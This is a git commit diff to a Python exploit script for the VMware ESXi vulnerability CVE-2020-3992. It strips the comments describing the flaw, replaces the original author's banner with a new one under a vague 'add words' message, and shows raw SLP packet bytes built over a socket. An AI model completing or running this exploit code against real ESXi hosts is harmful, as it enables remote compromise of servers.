a979fe9c56a9a5960cc0602ea550ec1c6f388155
ceciliaaii <hancool1025@gmail.com>
2023-04-26 11:55:59 +0800

    增加了一些新内容
    add words

--- CVE_2020_3992.py
+++ CVE_2020_3992.py
@@ -1,16 +1,13 @@
 import socket
 
-# 适用于Vmware ESXi = 6.7，ESXi = 6.5，ESXi = 7.0，•	Vmware Cloud Foundation (ESXi) = 3.X，Vmware Cloud Foundation (ESXi) = 4.X
-# 说明：CVE-2020-3992
-# Vmware ESXI 远程代码执行漏洞
-
 print('''
-.__                                             .__   
-|  |__  _____     ____    ____    ____    ____  |  |  
-|  |  \ \__  \   /    \ _/ ___\  /  _ \  /  _ \ |  |  
-|   Y  \ / __ \_|   |  \\  \___ (  <_> )(  <_> )|  |__
-|___|  /(____  /|___|  / \___  > \____/  \____/ |____/
-     \/      \/      \/      \/   author@hancool
+              _ _ _ _
+              (_) (_) (_|_)
+  ___ ___ ___ _| |_ _ _ _ _ _ _
+ / __/ _ \/ __| | | |/ _` |/ _` | | |
+| (_| __/ (__| | | | (_| | (_| | | |
+ \___\___|\___|_|_|_|\__,_|\__,_|_|_|                                    
+                                author@ceciliaaii
 ''')
 header = b"\x02" + b"\x08" + b"\x00\x00\x49" + b"\x00\x00" + b"\x00\x00\x00" + b"\x00\x00" + b"\x00\x02" + b"\x65\x6e"
 daadvert = b"\x00\x00" + b"\x00\x00\x01\x00" + b"\x00\x14" + b"http://www.baidu.com" + b"\x00\x0a" + b"abcdefghij" + b"\x00\x0a" + b"pppppppppp" + b"\x00\x02" + b"bb" + b"\x00"
